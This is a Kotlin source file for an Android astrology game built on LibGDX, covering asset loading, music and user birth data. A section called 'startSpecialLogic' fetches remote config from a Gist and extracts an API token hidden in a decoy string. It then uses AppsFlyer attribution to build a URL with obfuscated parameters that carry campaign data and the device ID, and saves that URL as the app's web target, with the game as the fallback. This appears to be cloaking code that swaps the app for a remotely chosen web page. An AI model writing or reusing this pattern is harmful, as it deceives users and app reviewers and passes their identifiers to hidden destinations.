package com.magicguru.aistrologer.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Texture
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.magicguru.aistrologer.MainActivity
import com.magicguru.aistrologer.appContext
import com.magicguru.aistrologer.game.dataStore.DS_UserData
import com.magicguru.aistrologer.game.manager.*
import com.magicguru.aistrologer.game.manager.util.MusicUtil
import com.magicguru.aistrologer.game.manager.util.ParticleEffectUtil
import com.magicguru.aistrologer.game.manager.util.SoundUtil
import com.magicguru.aistrologer.game.manager.util.SpriteUtil
import com.magicguru.aistrologer.game.screens.LoaderScreen
import com.magicguru.aistrologer.game.utils.GLOBAL_listZodiacName
import com.magicguru.aistrologer.game.utils.GameColor
import com.magicguru.aistrologer.game.utils.advanced.AdvancedGame
import com.magicguru.aistrologer.game.utils.disposeAll
import com.magicguru.aistrologer.game.utils.gdxGame
import com.magicguru.aistrologer.game.utils.getZodiacIndex
import com.magicguru.aistrologer.util.Gist
import com.magicguru.aistrologer.util.log
import com.magicguru.aistrologer.util.utilChatGPT.RetrofitClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean

var GDX_GLOBAL_isPauseGame = false

var GDX_GLOBAL_isGame = false
    private set
var GDX_GLOBAL_fullUrl = ""

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set
    lateinit var particleEffectManager: ParticleEffectManager private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    val particleEffectUtil by lazy { ParticleEffectUtil() }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("SharedPrefsGame", MODE_PRIVATE)

    lateinit var currentBackground: Texture

    val ds_UserData = DS_UserData(coroutine)

    val mapUser     = mutableMapOf<Int, String>()
    var zodiacIndex = 0
    val currentDate: String = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        particleEffectManager = ParticleEffectManager(assetManager)

        ds_UserData.flow.value.also { dataUser ->
            if (dataUser.uName != null) {
                mapUser[0] = dataUser.uName.toString()
                mapUser[1] = dataUser.placeOfBirth.toString()
                mapUser[2] = dataUser.dateOfBirth.toString()
                zodiacIndex = getZodiacIndex(dataUser.dateOfBirth.toString())
            }
        }
        log("userData = $mapUser | $zodiacIndex | ${GLOBAL_listZodiacName[zodiacIndex]}")

        navigationManager.navigate(LoaderScreen::class.java.name)

        startSpecialLogic()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        super.pause()
        if (GDX_GLOBAL_isPauseGame) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        super.resume()
        if (GDX_GLOBAL_isPauseGame.not()) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun startSpecialLogic() {
        log("startSpecialLogic")

        //activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GLOBAL_isGame = true

        val isRedirectThankKey = gdxGame.sharedPreferences.getBoolean("redirectThankKey", false)
        if (isRedirectThankKey) return

        val savedData = sharedPreferences.getString("savedData", "noUrl") ?: "noUrl"

        coroutine.launch(Dispatchers.IO) {
            val getJSON = Gist.getDataJson()
            if (getJSON != null) RetrofitClient.dynamicToken = getJSON.broken.replace("PIRELLY", "")
        }

        try {
            if (savedData == "noUrl") {
                coroutine.launch(Dispatchers.Default) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (getJSON != null) {
                        RetrofitClient.dynamicToken = getJSON.broken.replace("PIRELLY", "")

                        AppsFlyerLib.getInstance().init(getJSON.key, getAppsFlyerConversionListener(getJSON.link), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, getJSON.key, getAppsFlyerRequestListener())
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                log("link SAVED = $savedData")
                GDX_GLOBAL_fullUrl = savedData
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?xczfswlkf=$campaign&mahev=$afAd&idsrbfn=$media&yflkhkp=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("savedData", link).apply() }

                //activity.webViewHelper.showUrl(link)

                GDX_GLOBAL_fullUrl = link

            } else GDX_GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GDX_GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}